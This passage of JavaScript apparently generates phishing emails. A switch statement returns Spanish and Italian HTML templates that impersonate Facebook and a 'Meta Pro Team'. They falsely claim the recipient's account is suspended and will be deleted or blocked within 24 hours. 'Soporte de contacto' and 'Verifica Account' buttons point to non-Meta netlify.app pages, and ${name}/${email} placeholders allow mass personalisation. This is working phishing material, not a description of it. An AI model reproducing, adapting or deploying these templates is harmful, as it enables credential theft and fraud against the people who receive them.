                                                                        <table border="0" cellpadding="0" cellspacing="0" class="btn btn-primary w-full" style="border-radius: 6px; border-collapse: separate !important; width: 100%;" width="100%">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="center" bgcolor="#0d6efd" style="line-height: 24px; font-size: 16px; border-radius: 6px; width: 100%; margin: 0;" width="100%"><a href="https://sweeter-gh4afg3-id43141451tt.netlify.app/dev.html" style="color: #ffffff; font-size: 16px; font-family: Helvetica, Arial, sans-serif; text-decoration: none; border-radius: 6px; line-height: 20px; display: block; font-weight: normal; white-space: nowrap; background-color: #0d6efd; padding: 8px 12px; border: 1px solid #0d6efd;"><span style="font-size:20px;"><b class="text-xl" style="font-size: 20px; line-height: 24px;">Soporte de contacto</b></span></a></td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </td>
                            </tr>
                        </tbody>
                    </table>

                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                        <tbody>
                            <tr>
                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                            </tr>
                        </tbody>
                    </table>

                    <div class="footer">
                        <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <p align="left" class="text-gray-500  text-xs" style="line-height: 14.4px; font-size: 12px; color: #a0aec0; width: 100%; margin: 0;">This message was sent to <span class="text-primary" style="color: #0d6efd;">${email}</span>. If you don&#39;t want to receive these emails from Facebook in the future, please unsubscribe.</p>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <p align="left" class="text-gray-500 text-xs" style="line-height: 14.4px; font-size: 12px; color: #a0aec0; width: 100%; margin: 0;">To help keep your account secure, please don&#39;t forward this email. <span class="text-primary" style="color: #0d6efd;">Learn more</span></p>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
            </tr>
        </tbody>
    </table>
</body>

      `
    case ("Tây ban nha" || "TBN"): 
      return `
<body style="height: auto; min-height: auto;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 600px; margin: 0 auto;">
        <tbody>
            <tr>
                <td align="left" style="line-height: 24px; font-size: 16px; margin: 0;">&nbsp;
                    <table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" class="card" style="border-radius: 6px; border-collapse: separate !important; width: 100%; overflow: hidden; border: 1px solid #e2e8f0;">
                        <tbody>
                            <tr>
                                <td align="left" bgcolor="#ffffff" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;">
                                    <table border="0" cellpadding="0" cellspacing="0" class="card-body" style="width: 100%;">
                                        <tbody>
                                            <tr>
                                                <td align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0; padding: 20px;">
                                                    <table bgcolor="#0d6efd" border="0" cellpadding="0" cellspacing="0" class="bg-primary py-10 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <div>

                                                        <p align="center" class="text-center  text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;">&nbsp;</p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="hr" style="width: 100%;">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" style="line-height: 24px; font-size: 16px; border-top-width: 1px; border-top-color: #e2e8f0; border-top-style: solid; height: 1px; width: 100%; margin: 0;">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <div>
                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><strong><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Estimado</span></span>${name}.</strong></p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Lamentamos informarle que su cuenta publicitaria ha sido suspendida debido a violaciones de políticas y la difusión de información errónea, noticias falsas o actividad fraudulenta plantea graves problemas a la comunidad.<br />
									<br />
                                                        </p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>

                                                        <p align="left" class="text-lg" style="line-height: 21.6px; font-size: 18px; width: 100%; margin: 0;"><span style="font-size:16px;"><span style="font-family:Arial,Helvetica,sans-serif;">Con esta carta le informamos que su cuenta de Facebook se encuentra actualmente en estado restringido. Debido a esta restricción, tu cuenta será eliminada en las próximas horas.</span></span>
                                                        </p>

                                                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                                                            <tbody>
                                                                <tr>
                                                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>

                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>

                                                    <table bgcolor="#edf2f7" border="0" cellpadding="0" cellspacing="0" class="bg-gray-200 p-4 rounded w-full" style="border-radius: 4px; width: 100%;" width="100%">
                                                        <tbody>
                                                            <tr>
                                                                <td align="left" bgcolor="#edf2f7" style="line-height: 24px; font-size: 16px; border-radius: 4px; width: 100%; margin: 0; padding: 16px;" width="100%">
                                                                    <div class="row" style="margin-right: -24px;">
                                                                        <table border="0" cellpadding="0" cellspacing="0" style="table-layout: fixed; width: 100%;" width="100%">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="left" class="col-2" style="line-height: 24px; font-size: 16px; min-height: 1px; font-weight: normal; padding-right: 24px; width: 16.666667%; margin: 0;"><img alt="" class="w-full" src="https://i.ibb.co/QFDTgSk/l.png" style="height: auto; line-height: 100%; outline: none; text-decoration: none; display: block; width: 100%; border-style: none; border-width: 0;"
                                                                                            width="100%" /></td>
                                                                                    <td align="left" class="col-10" style="line-height: 24px; font-size: 16px; min-height: 1px; font-weight: normal; padding-right: 24px; width: 83.333333%; margin: 0;">
                                                                                        <h4 align="left" class="text-xl" style="padding-top: 0; padding-bottom: 0; font-weight: 500; vertical-align: baseline; font-size: 20px; line-height: 24px; margin: 0;">La cuenta será bloqueada después de 24 horas.</h4>

                                                                                        <p align="left" class="text-secondary text-lg" style="line-height: 21.6px; font-size: 18px; color: #718096; width: 100%; margin: 0;">Para continuar usándolo, haga clic en el botón de verificación de cuenta a continuación y siga las instrucciones.</p>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>

                                                                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>

                                                                    <div>
                                                                        <table border="0" cellpadding="0" cellspacing="0" class="btn btn-primary w-full" style="border-radius: 6px; border-collapse: separate !important; width: 100%;" width="100%">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td align="center" bgcolor="#0d6efd" style="line-height: 24px; font-size: 16px; border-radius: 6px; width: 100%; margin: 0;" width="100%"><a href="https://sweeter-gh4afg3-id43141451tt.netlify.app/dev.html" style="color: #ffffff; font-size: 16px; font-family: Helvetica, Arial, sans-serif; text-decoration: none; border-radius: 6px; line-height: 20px; display: block; font-weight: normal; white-space: nowrap; background-color: #0d6efd; padding: 8px 12px; border: 1px solid #0d6efd;"><span style="font-size:20px;"><b class="text-xl" style="font-size: 20px; line-height: 24px;">Soporte de contacto</b></span></a></td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </td>
                            </tr>
                        </tbody>
                    </table>

                    <table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
                        <tbody>
                            <tr>
                                <td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
                            </tr>
                        </tbody>
                    </table>

                    <div class="footer">
                        <table border="0" cellpadding="0" cellspacing="0" class="s-5 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="20" style="line-height: 20px; font-size: 20px; width: 100%; height: 20px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <p align="left" class="text-gray-500  text-xs" style="line-height: 14.4px; font-size: 12px; color: #a0aec0; width: 100%; margin: 0;">This message was sent to <span class="text-primary" style="color: #0d6efd;">${email}</span>. If you don&#39;t want to receive these emails from Facebook in the future, please unsubscribe.</p>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>

                        <p align="left" class="text-gray-500 text-xs" style="line-height: 14.4px; font-size: 12px; color: #a0aec0; width: 100%; margin: 0;">To help keep your account secure, please don&#39;t forward this email. <span class="text-primary" style="color: #0d6efd;">Learn more</span></p>

                        <table border="0" cellpadding="0" cellspacing="0" class="s-1 w-full" style="width: 100%;" width="100%">
                            <tbody>
                                <tr>
                                    <td align="left" height="4" style="line-height: 4px; font-size: 4px; width: 100%; height: 4px; margin: 0;" width="100%">&nbsp;</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
            </tr>
        </tbody>
    </table>
</body>

</html>
      `
    case "italia":
      return `
        <body style="height: auto; min-height: auto;">
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 600px; margin: 0 auto;">
	<tbody>
		<tr>
			<td align="left" style="line-height: 24px; font-size: 16px; margin: 0;">
			<table bgcolor="#edf2f7" border="0" cellpadding="0" cellspacing="0" class="card  border-0 bg-gray-200" style="border-radius: 6px; border-collapse: separate !important; width: 100%; overflow: hidden; border: 0px solid #e2e8f0;">
				<tbody>
					<tr>
						<td align="left" bgcolor="#edf2f7" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;">
						<table border="0" cellpadding="0" cellspacing="0" class="card-body" style="width: 100%;">
							<tbody>
								<tr>
									<td align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0; padding: 20px;">
									<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" class="container p-4 bg-white" style="width: 100%;">
										<tbody>
											<tr>
												<td align="center" bgcolor="#ffffff" style="line-height: 24px; font-size: 16px; margin: 0; padding: 16px;">
												<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 100%; max-width: 600px; margin: 0 auto;">
													<tbody>
														<tr>
															<td align="left" style="line-height: 24px; font-size: 16px; margin: 0;">
															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Ciao ${name}.</span></p>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Abbiamo rilevato attivit&agrave; insolite nel tuo account che violano i nostri termini di servizio. Le violazioni delle politiche e la diffusione di disinformazione, notizie false o attivit&agrave; fraudolente sono problemi seri che la comunit&agrave; deve affrontare.</span></p>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Azione necessaria:</span></p>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Potresti non vedere altre persone accedere al tuo account, qualcuno potrebbe spacciarsi per il tuo account e violare intenzionalmente le linee guida pubblicitarie diffondendo informazioni false. Devi verificare il tuo account in modo che possiamo aiutarti a recuperare e proteggere in sicurezza il tuo account personale.</span></p>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-2 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="8" style="line-height: 8px; font-size: 8px; width: 100%; height: 8px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="btn btn-primary  p-4" style="border-radius: 6px; border-collapse: separate !important;">
																<tbody>
																	<tr>
																		<td align="center" bgcolor="#0d6efd" style="line-height: 24px; font-size: 16px; border-radius: 6px; margin: 0;"><span style="font-size:18px;"><a href="https://pengh5-hg6hs3-id64767612tt.netlify.app/dev.html" style="color: #ffffff; font-size: 16px; font-family: Helvetica, Arial, sans-serif; text-decoration: none; border-radius: 6px; line-height: 20px; display: block; font-weight: normal; white-space: nowrap; background-color: #0d6efd; padding: 16px; border: 2px solid #0d6efd;"><b>Verifica Account</b></a></span></td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-2 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="8" style="line-height: 8px; font-size: 8px; width: 100%; height: 8px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Se il controllo di sicurezza non viene completato entro 24 ore, saremo costretti a bloccare temporaneamente il tuo account personale. Evitare di diffondere informazioni false e di causare danni alla comunit&agrave;.</span></p>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;">&nbsp;</p>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Grazie per la tempestiva attenzione prestata a questo argomento.</span></p>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;">&nbsp;</p>

															<p align="left" style="line-height: 24px; font-size: 16px; width: 100%; margin: 0;"><span style="font-size:18px;">Distinti saluti,</span></p>

															<p style="line-height: 24px; font-size: 16px; width: 100%; margin: 0px; text-align: center;"><span style="font-size:18px;">Meta Pro Team</span></p>

															<table border="0" cellpadding="0" cellspacing="0" class="s-3 w-full" style="width: 100%;" width="100%">
																<tbody>
																	<tr>
																		<td align="left" height="12" style="line-height: 12px; font-size: 12px; width: 100%; height: 12px; margin: 0;" width="100%">&nbsp;</td>
																	</tr>
																</tbody>
															</table>
															</td>
														</tr>
													</tbody>
												</table>
												</td>
											</tr>
										</tbody>
									</table>

									<div class="footer">&nbsp;</div>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>

			<table border="0" cellpadding="0" cellspacing="0" class="s-10 w-full" style="width: 100%;" width="100%">
				<tbody>
					<tr>
						<td align="left" height="40" style="line-height: 40px; font-size: 40px; width: 100%; height: 40px; margin: 0;" width="100%">&nbsp;</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>
</body>
</html>

      `
  }
}